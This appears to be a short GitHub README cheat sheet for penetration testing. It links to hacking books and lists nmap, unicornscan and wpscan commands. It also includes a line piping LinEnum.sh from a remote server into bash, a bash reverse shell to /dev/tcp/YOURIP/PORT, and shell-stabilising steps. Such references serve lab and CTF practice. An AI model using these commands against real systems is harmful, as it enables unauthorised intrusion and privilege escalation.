# Usefull-hacking-tips
Some books you want to read:<br>
<ul>
<li><a href="https://www.amazon.com/gp/product/1980901759/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=1980901759&linkCode=as2&tag=1333706-20&linkId=b7f2896fbcc265738ba6f2803339d6d2" target="_blank">The Hacker Playbook 3: Practical Guide To Penetration Testing</a></li>
<li><a href="https://amzn.to/2zvdQmI" target="_blank"> Advanced Penetration Testing: Hacking the World's Most Secure Networks</a></li>
  <li><a href="https://amzn.to/2P9TnbS" target="_blank">Social Engineering: The Science of Human Hacking</a></li>
</ul>

usefull tips and tools for hacking
<ul>
  <li> create a file with a range of ip addresses: seq -f "10.10.10.%g" 1 254 > ip.txt
  <li> or use prips 10.0.0.0/23 > ip.txt (first install prips: apt install prips)
  <li>echo  $HISTFILE to check the history file location
</ul>

<b>Port scan commands</b>
<ul>
  <li> nmap -T4 -sV -sT --reason -p1-65535 --vv -oN 'filename' 'IP'
  <li> nmap -sC -sV -oA filename ip - ippsec parameters
  <li> nmap --script vuln 'IP'
  <li> nmap -sV -sC -A -oN filename ip
  <li> unicornscan -r300 -mU 'IP' - UDP scan. USE -mT for TCP
</ul>

<b>IpSec</b>
<ul>
  <li> python -m SimpleHTTPServer PORT
  <li> curl IP:PORT/LinEnum.sh | bash
</ul>

<b>Priv Esc</b>
<ul>
  <li> sudo -l
</ul>

    
<b>Shell</b>
<ul>
  <li> bash -c 'bash -i >& /dev/tcp/YOURIP/PORT 0>&1'
  <li> when having a shell type CTRL-Z to background the shell. then type stty raw -echo and then fg
</ul>

<b>WPscan</b>
<ul>
  <li> wpscan -u URL -eu -ep -et
</ul>
